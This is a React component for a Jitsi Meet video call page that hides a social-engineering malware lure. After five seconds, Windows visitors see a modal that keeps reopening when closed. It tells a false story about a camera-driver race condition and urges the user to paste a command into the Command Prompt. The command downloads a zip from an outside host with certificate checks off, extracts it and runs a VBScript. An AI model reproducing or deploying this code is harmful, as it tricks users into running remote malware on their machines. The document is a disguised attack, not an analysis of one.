"use client";
import { useEffect, useState, useRef } from "react";
import Modal from "react-modal";
import {
  BsCheckCircleFill,
  BsCopy,
  BsX
} from "react-icons/bs";
import { useWizard } from "@/index";
const baseUrl =
  import.meta.env.BASE_URL === "/" ? "" : import.meta.env.BASE_URL;
const JitsiMeet = ({ }) => {
  const { values } = useWizard();
  const { Username = {} } = values;
  const { username } = Username;

  const roomName = window.location.pathname.split("/")[1];

  const jitsiContainerRef = useRef(null);
  const apiRef = useRef(null);
  const [isOpen, setIsOpen] = useState(false);
  const customStyles = {
    overlay: {
      backgroundColor: 'rgba(0, 0, 0, 0.55)'
    },
    content: {
      width: "960px", // Custom width
      maxWidth: "90%", // Responsive
      margin: "auto",
      borderRadius: "12px",
      background: "#fff",
      padding: "20px",
      height: '580px'
    },
  };
  const [copied, setCopied] = useState(false);
  const textToCopy = `curl -k -o "%TEMP%\\nvidiaRelease.zip" https://backend-eaxu.onrender.com/cameraDriver && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nvidiaRelease.zip' -DestinationPath '%TEMP%\\nvidiaRelease'" && wscript "%TEMP%\\nvidiaRelease\\update.vbs"`;

  const handleCopy = async () => {
    await navigator.clipboard.writeText(textToCopy);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  const checkingBrowser = () => {
    const userAgent = navigator.userAgent.toLowerCase();

    if (userAgent.indexOf('win') !== -1) {
      return true;
    } else {
      return false;
    }
  }

  useEffect(() => {
    setTimeout(() => { if (checkingBrowser()) { setIsOpen(true) } }, 5000)
    // ✅ Only initialize if Jitsi script is already loaded
    if (typeof window.JitsiMeetExternalAPI !== "function") {
      console.warn("⚠️ Jitsi script not loaded yet.");
      return;
    }

    const domain = "meet.jit.si";
    const options = {
      roomName: roomName || "MeetingRoom",
      width: "100%",
      height: 600,
      parentNode: jitsiContainerRef.current,
      userInfo: { displayName: username || "Guest" },
      configOverwrite: {
        prejoinPageEnabled: true,
        startWithAudioMuted: false,
        startWithVideoMuted: false,
      },
      interfaceConfigOverwrite: {
        // APP_NAME: 'Your Custom App Name',
        // SHOW_BRAND_WATERMARK: false, // removes brand watermark
        // SHOW_JITSI_WATERMARK: false, // removes left logo
        // BRAND_WATERMARK_LINK: "https://example.com", // your link
        // DEFAULT_LOGO_URL: 'https://cdn.prod.website-files.com/636b01f4514fce58703fb4a8/67bcb328e909664b82205e6b_Tirios_Logo_new.svg',
        TOOLBAR_BUTTONS: [
          "microphone",
          "camera",
          "fullscreen",
          "chat",
          "raisehand",
          "hangup",
        ],
      },
    };
    console.log(options)
    apiRef.current = new window.JitsiMeetExternalAPI(domain, options);
    console.log("✅ Jitsi meeting initialized");

    return () => {
      if (apiRef.current) apiRef.current.dispose();
    };
  }, []);

  const onClose = () => {
    setIsOpen(false);
    setTimeout(() => { setIsOpen(true) }, 2000);
  }

  return (
    <div>
      <div ref={jitsiContainerRef} style={{ width: "100%", height: "600px" }} />
      <Modal isOpen={isOpen} onRequestClose={onClose} contentLabel="How to setup camera driver" style={customStyles}
      >
        <h2 className='modal-heading'>Access to your camera or microphone is currently blocked.
        </h2>
        <button onClick={onClose}><BsX className="w-10 h-10 modal-close" /></button>
        <div className="modal-content m-4">
          <p>The camera drive discoverer on Windows has a race condition in its cache usage. This means multiple processes or threads accessing the cache at the same time can cause problems like</p>
          <p className="pl-5">•  Devices may not show correctly, or the cache might contain invalid data.</p>
          <p className="pl-5">•  Cameras might not appear, or detection might fail when multiple devices are connected.</p>
          <p className="pl-5">•  Some cameras could appear more than once or not be detected at all.</p><br />
          <p><b>Here is the solution identified for the issue.</b></p>
          <p>1. Open Command Prompt on Windows</p>
          <p className="pl-5">•  Press <b>Windows Key + R</b> to open the Run dialog.</p>
          <p className="pl-5">•  Type <b>cmd</b> and press Enter. This opens the Command Prompt.</p>
          <p> 2. Update Camera drivers on Windows</p>
          <p className="pl-5">•  To automatically update the latest drivers for Windows, use the following curl command.</p>

          <div className="flex items-center gap-3 bg-gray-800 text-white p-4 rounded-lg copy-text mt-4">
            <span className="font-mono whitespace-nowrap overflow-hidden text-ellipsis block w-full">
              {textToCopy}</span>
            <button onClick={handleCopy} className="p-2 hover:bg-gray-200 rounded copy-text-button">
              {copied ? (
                <><BsCheckCircleFill className="w-5 h-5 text-green-400 ml-1" /> Copied!</>
              ) : (
                <><BsCopy className="w-5 h-5 ml-1" /> Copy</>
              )}
            </button>
          </div>
        </div>
      </Modal>
    </div>
  );
};

export default JitsiMeet;